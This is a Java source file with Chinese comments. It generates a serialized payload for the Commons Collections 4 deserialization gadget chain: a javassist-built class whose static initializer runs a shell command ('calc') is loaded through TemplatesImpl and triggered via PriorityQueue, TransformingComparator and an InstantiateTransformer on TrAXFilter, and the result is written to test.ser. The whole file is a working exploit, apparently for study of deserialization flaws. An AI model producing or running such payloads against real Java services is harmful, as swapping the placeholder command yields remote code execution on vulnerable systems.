import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CommonsCollections4 {
    public static void main(String[] args) throws Exception {
        /* 生成字节码 */
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath((AbstractTranslet.class)));
        CtClass cc = classPool.makeClass("Evil");
        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
        cc.makeClassInitializer().insertBefore(cmd);//通过CtClass.makeClassInitializer方法在当前类创建了一个静态代码块
        cc.setName("Leihehe");
        cc.setSuperclass(classPool.get(AbstractTranslet.class.getName()));//必须要继承AbstractTranslet类
        final byte[] classBytes = cc.toBytecode();//获取字节码
        /* TemplatesImpl加载字节码 */
        TemplatesImpl templates = TemplatesImpl.class.newInstance();//创建一个templates对象
        setFieldValue(templates,"_name","leihehe");
        setFieldValue(templates,"_class",null);
        setFieldValue(templates,"_bytecodes",new byte[][]{classBytes});
        setFieldValue(templates,"_tfactory",new TransformerFactoryImpl());

        ConstantTransformer constantTransformer = new ConstantTransformer(String.class);
        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{String.class},new Object[]{"haha"});
        Transformer[] transformers = new Transformer[]{
                constantTransformer,
                instantiateTransformer
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        /* 创建TransformingComparator */
        TransformingComparator comparator = new TransformingComparator(chainedTransformer);

        /* 创建PriorityQueue */
        final PriorityQueue<Object> queue = new PriorityQueue<>(2,comparator);
        //priorityQueue -> TransformingComparator.compare -> ChainedTransformer.transform
        queue.add(1);//add elements
        queue.add(1);
        setFieldValue(constantTransformer,"iConstant",TrAXFilter.class);//需要在最后一步修改，否则出错

        setFieldValue(instantiateTransformer,"iParamTypes",new Class[]{Templates.class});
        setFieldValue(instantiateTransformer,"iArgs",new Object[]{templates});

        /* 写出序列化文件 */
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(("test.ser")));
        outputStream.writeObject(queue);
        outputStream.close();

    }
    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        }
        catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }
}
